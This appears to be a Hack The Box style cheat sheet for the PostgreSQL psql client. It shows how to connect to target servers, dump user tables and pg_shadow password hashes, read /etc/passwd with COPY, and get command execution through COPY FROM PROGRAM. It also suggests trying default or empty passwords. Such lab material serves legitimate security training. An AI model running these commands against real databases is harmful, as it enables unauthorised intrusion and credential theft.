# PostgreSQL Client - Connect to Postgres Databases

Command-line client for connecting to PostgreSQL servers.

## What It Does

The `psql` command connects you to PostgreSQL databases, commonly found on Linux targets running on port 5432. Postgres is popular with web applications, and finding creds or an open instance can give you access to sensitive data. Postgres also has built-in features that let you run system commands if you have the right privileges, making it a great escalation vector.

## Install

```bash
sudo apt install postgresql-client
```

## Basic Usage

```bash
# Connect to a remote Postgres server
psql -h 10.10.10.20 -U postgres -W

# Connect to a specific database
psql -h 10.10.10.20 -U postgres -d webapp

# Connect with password in environment variable (avoids prompt)
PGPASSWORD='secret' psql -h 10.10.10.20 -U postgres
```

## Practical Examples

```bash
# After connecting, explore the databases
\l                              # List all databases
\c webapp                       # Connect to a database
\dt                             # List tables in current database
\d users                        # Describe a table's structure
SELECT * FROM users;            # Dump table contents

# Look for credentials
SELECT username, password FROM users;
SELECT * FROM pg_shadow;        # Postgres user hashes (needs superuser)

# Try command execution (if superuser)
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'id';
SELECT * FROM cmd_exec;

# Read local files
COPY cmd_exec FROM '/etc/passwd';
SELECT * FROM cmd_exec;
```

## Common Flags

```bash
-h <host>       # Target hostname/IP
-U <user>       # Username
-d <database>   # Database name
-p <port>       # Port (default 5432)
-W              # Force password prompt
-c "query"      # Execute a query and exit
```

## Useful psql Commands

```
\l              # List databases
\c <db>         # Switch database
\dt             # List tables
\d <table>      # Describe table
\du             # List users/roles
\q              # Quit
```

## HTB Tips

- Default user is `postgres`, always try it with common or empty passwords
- The `COPY FROM PROGRAM` trick gives you RCE if you're superuser
- Postgres password hashes (md5 format) can be cracked with hashcat mode 12
- Web app config files (like Django's `settings.py`) often contain Postgres creds
- If psql refuses remote connections, try again after getting a local shell
- Check for trust authentication in `pg_hba.conf`, it means no password needed
